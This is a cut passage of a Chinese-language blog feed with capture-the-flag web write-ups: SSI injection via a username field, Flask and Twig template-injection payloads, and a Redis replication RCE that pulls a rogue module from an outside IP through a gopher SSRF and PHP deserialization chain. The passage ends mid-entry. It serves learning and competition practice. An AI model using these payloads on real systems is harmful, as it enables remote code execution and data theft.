    <summary type="html">&lt;h1 id=&quot;vm&quot;&gt;&lt;a href=&quot;#vm&quot; class=&quot;headerlink&quot; title=&quot;vm&quot;&gt;&lt;/a&gt;vm&lt;/h1&gt;&lt;h2 id=&quot;常用的vm模块的API&quot;&gt;&lt;a href=&quot;#常用的vm模块的API&quot; class=&quot;headerlink&quot; title=&quot;常用的</summary>
      
    
    
    
    
    <category term="沙箱逃逸" scheme="http://example.com/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <link href="http://example.com/2024/01/24/BJDCTF2020-EasySearch/"/>
    <id>http://example.com/2024/01/24/BJDCTF2020-EasySearch/</id>
    <published>2024-01-24T08:17:42.000Z</published>
    <updated>2024-01-24T08:44:18.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>通过扫描发现源码泄露</p><p>index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是一个md5截断</p><p>之前的脚本稍微修改一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">&#x27;6d0bc1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findCode</span>(<span class="params">code</span>):   </span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])  </span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">6</span>] == knownMd5:            </span><br><span class="line">            <span class="built_in">print</span> (code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">list</span>=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):    <span class="comment">#这里的range(number)指爆破出多少结果停止</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#使用多线程加快爆破速度</span></span><br><span class="line">pool.<span class="built_in">map</span>(findCode, <span class="built_in">list</span>) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑出来是<code>2020666</code></p><p>传入一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124162515513.png" alt="image-20240124162515513"></p><p>响应头中会返回写入的shtml的地址</p><p>访问一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124162701416.png" alt="image-20240124162701416"></p><p>这样的hello xxx最先想到的就是ssti,不过这里似乎不太一样</p><p>先看看什么是shtml</p><h2 id="何为shtml？"><a href="#何为shtml？" class="headerlink" title="何为shtml？"></a>何为shtml？</h2><blockquote><p>SHTML即Server-Parsed HTML。</p><p>shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析。可以使用SSI指令将其它文件、图片包含在页面中，也可以将其它的CGI程序包含在页面中，如.aspx文件。在给客户端返回的页面中不会包含SSI指令。如果SSI指令不能被解析，则浏览器会将其做为普通的HTML注释处理</p></blockquote><p>可以看见这个shtml是可以包含SSI命令的,那什么是SSI呢?</p><h2 id="何为SSI"><a href="#何为SSI" class="headerlink" title="何为SSI"></a>何为SSI</h2><blockquote><p>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p></blockquote><p>SSI可以直接执行系统命令</p><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure><p>所以我们可以将username改成上面这种ssi命令以达到rce</p><p>最终payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure><p>flag就在当前目录的上一级目录中</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSI注入漏洞总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BJDCTF2020-EasySearch&quot;&gt;&lt;a href=&quot;#BJDCTF2020-EasySearch&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]EasySearch&quot;&gt;&lt;/a&gt;[BJDCTF2020]EasySearch</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="SSI注入" scheme="http://example.com/tags/SSI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>WesternCTF2018 shrine</title>
    <link href="http://example.com/2024/01/23/WesternCTF2018-shrine/"/>
    <id>http://example.com/2024/01/23/WesternCTF2018-shrine/</id>
    <published>2024-01-23T14:59:00.000Z</published>
    <updated>2024-01-23T16:19:43.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>shrine 圣地?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import flask import os app = flask.Flask(__name__) app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) @app.route(&#x27;/&#x27;) def index(): return open(__file__).read() @app.route(&#x27;/shrine/&#x27;) def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == &#x27;__main__&#x27;: app.run(debug=True) </span><br></pre></td></tr></table></figure><p>很无语这种python放一坨…</p><p>手动format一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(debug=<span class="literal">True</span>) </span><br></pre></td></tr></table></figure><p>很明显是ssti,flag被放在了当前app的config里</p><p>在<code>/shrine/</code>这个路由下接收一个参数并使用<code>safe_jinja(s)</code>这个自定义的函数对输入做了一些简单的过滤</p><p>config和self被禁了,是不能直接传入config来查看flag的__(注意,这里并不是正则来禁掉config)__</p><p>看了大佬的文章,总结一下</p><h3 id="在Flask中有4个全局变量"><a href="#在Flask中有4个全局变量" class="headerlink" title="在Flask中有4个全局变量"></a>在Flask中有4个全局变量</h3><h4 id="current-app"><a href="#current-app" class="headerlink" title="current_app"></a>current_app</h4><p>代表当前flask程序实例</p><h4 id="g"><a href="#g" class="headerlink" title="g"></a>g</h4><p>g作为flask程序全局的一个临时变量。充当媒介的功能</p><h4 id="requests对象"><a href="#requests对象" class="headerlink" title="requests对象"></a>requests对象</h4><p>客户端发送的HTTP请求内容</p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><h4 id="用户会话"><a href="#用户会话" class="headerlink" title="用户会话"></a>用户会话</h4><p>而current_app又是flask的实例,也就是说。所有和flask有关的。都会放在current_app里面</p><p>既然current_app是一个变量,那就一定存在于__globals__里面,因为globals是python中所有变量的集合</p><p>这里我们只能通过函数去调用__globals__。获得所有全局变量</p><h3 id="flask自带的两个函数"><a href="#flask自带的两个函数" class="headerlink" title="flask自带的两个函数"></a>flask自带的两个函数</h3><h4 id="url-for"><a href="#url-for" class="headerlink" title="url_for()"></a>url_for()</h4><p>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for(<span class="string">&#x27;home&#x27;</span>)&#125;&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>如果我们定义的路由URL是带有参数的,则可以把它们作为关键字参数传入url_for(),Flask会把他们填充进最终生成的URL中:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for(<span class="string">&#x27;post&#x27;</span>, post_id=<span class="number">1</span>)&#125;&#125;</span><br><span class="line">/post/<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages()"></a>get_flashed_messages()</h4><p>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> message <span class="keyword">in</span> get_flashed_messages()%&#125;</span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>可以看见这两个函数都是可以调用到__globals__魔术方法的,并且有current_app这个变量</p><ul><li>__globals__  : 函数中全局变量的字典的引用(函数所属模块的全局命名空间)</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124000216790.png" alt="image-20240124000216790"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124000328684.png" alt="image-20240124000328684"></p><p>这个current_app实例就是当前运行的这个app,所有可以直接访问到它下面的config</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__.current_app.config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124000738986.png" alt="image-20240124000738986"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://guokeya.github.io/post/R7LJ4aK5U/">https://guokeya.github.io/post/R7LJ4aK5U/</a></p><p><a href="https://blog.csdn.net/enjolras_fuu/article/details/82229073">https://blog.csdn.net/enjolras_fuu/article/details/82229073</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WesternCTF2018-shrine&quot;&gt;&lt;a href=&quot;#WesternCTF2018-shrine&quot; class=&quot;headerlink&quot; title=&quot;[WesternCTF2018]shrine&quot;&gt;&lt;/a&gt;[WesternCTF2018]shrine</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Flask" scheme="http://example.com/tags/Flask/"/>
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 Cookie is so stable</title>
    <link href="http://example.com/2024/01/23/BJDCTF2020-Cookie-is-so-stable/"/>
    <id>http://example.com/2024/01/23/BJDCTF2020-Cookie-is-so-stable/</id>
    <published>2024-01-23T14:15:43.000Z</published>
    <updated>2024-01-23T14:47:49.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>随便登录一个用户名,发现会有 hello,xxx的字样</p><p>hint让我们查看一下cookie</p><p>可以看见cookie里面有一个user的值就是回显的内容,这很容易就能想到ssti</p><p>测试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240123222241974.png" alt="image-20240123222241974"></p><p>的确如此哈</p><p>这里是php环境, 不过之前只做过smarty的模板注入,这里简单测试了一下并不是smarty</p><p>找了一篇大佬的好文</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#">https://www.cnblogs.com/bmjoker/p/13508538.html#</a></p><p>最终的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BJDCTF2020-Cookie-is-so-stable&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Cookie-is-so-stable&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Cookie is so stable&quot;</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Twig" scheme="http://example.com/tags/Twig/"/>
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>GCTF 2023 web</title>
    <link href="http://example.com/2024/01/22/GCTF-2023-web/"/>
    <id>http://example.com/2024/01/22/GCTF-2023-web/</id>
    <published>2024-01-22T15:59:31.000Z</published>
    <updated>2024-01-22T16:33:54.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GCTF"><a href="#GCTF" class="headerlink" title="GCTF"></a>GCTF</h1><h2 id="ezezezphp"><a href="#ezezezphp" class="headerlink" title="ezezezphp"></a>ezezezphp</h2><p>redis主从复制rce</p><p>需要在靶机上执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp/</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 107.148.75.202 21000</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p>使用sec-tool转换为gopher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%35%0d%0a%2f%74%6d%70%2f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%36%0d%0a%65%78%70%2e%73%6f%0d%0a%2a%33%0d%0a%24%37%0d%0a%73%6c%61%76%65%6f%66%0d%0a%24%31%34%0d%0a%31%30%37%2e%31%34%38%2e%37%35%2e%32%30%32%0d%0a%24%35%0d%0a%32%31%30%30%30%0d%0a%2a%33%0d%0a%24%36%0d%0a%6d%6f%64%75%6c%65%0d%0a%24%34%0d%0a%6c%6f%61%64%0d%0a%24%31%31%0d%0a%2f%74%6d%70%2f%65%78%70%2e%73%6f%0d%0a%2a%32%0d%0a%24%31%31%0d%0a%73%79%73%74%65%6d%2e%65%78%65%63%0d%0a%24%36%0d%0a%77%68%6f%61%6d%69%0d%0a</span><br></pre></td></tr></table></figure><p>利用ssrf来执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:3:&quot;0.o&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:703:&quot;gopher://127.0.0.1:6379/_%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%35%0d%0a%2f%74%6d%70%2f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%36%0d%0a%65%78%70%2e%73%6f%0d%0a%2a%33%0d%0a%24%37%0d%0a%73%6c%61%76%65%6f%66%0d%0a%24%31%34%0d%0a%31%30%37%2e%31%34%38%2e%37%35%2e%32%30%32%0d%0a%24%35%0d%0a%32%31%30%30%30%0d%0a%2a%33%0d%0a%24%36%0d%0a%6d%6f%64%75%6c%65%0d%0a%24%34%0d%0a%6c%6f%61%64%0d%0a%24%31%31%0d%0a%2f%74%6d%70%2f%65%78%70%2e%73%6f%0d%0a%2a%32%0d%0a%24%31%31%0d%0a%73%79%73%74%65%6d%2e%65%78%65%63%0d%0a%24%36%0d%0a%77%68%6f%61%6d%69%0d%0a&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:3:&quot;o.0&quot;;&#125;</span><br></pre></td></tr></table></figure><p>pop链子的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span> = <span class="string">&quot;o.0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Ha</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start1 = <span class="keyword">new</span> <span class="title class_">Rd</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start = <span class="keyword">array</span>(<span class="string">&#x27;POC&#x27;</span> =&gt; <span class="string">&#x27;0.o&#x27;</span>);</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start1-&gt;cl = <span class="keyword">new</span> <span class="title class_">Er</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start1-&gt;cl-&gt;Flag = <span class="string">&quot;&quot;</span>;<span class="comment">//这里是要执行的gopher的base64</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同时vps使用redis-rogue-server监听21000端口</p><p>payload上传成功</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240123002815556.png" alt="image-20240123002815556"></p><p>之后就可以用system.exec来rce了,但是没有找到flag</p><figure class="highlight plaintext"><table><tr><td 